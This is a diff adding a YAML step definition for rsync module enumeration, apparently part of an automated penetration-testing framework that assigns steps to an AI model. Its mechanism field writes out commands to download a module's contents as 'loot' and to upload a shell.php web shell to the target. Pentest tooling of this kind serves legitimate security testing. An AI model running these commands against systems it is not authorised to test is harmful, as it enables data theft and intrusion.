@@ -1,0 +1,16 @@
+name: rsync_enum
+category: services
+description: Rsync module enumeration
+preconditions:
+  - service.port==873
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "rsync --list-only rsync://{target_ip}/"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 120
+model_tier: haiku
+mechanism: "List rsync modules (shares). No auth may be required. Download: rsync -av rsync://target/module /tmp/loot. Upload: rsync -av shell.php rsync://target/module/path/."
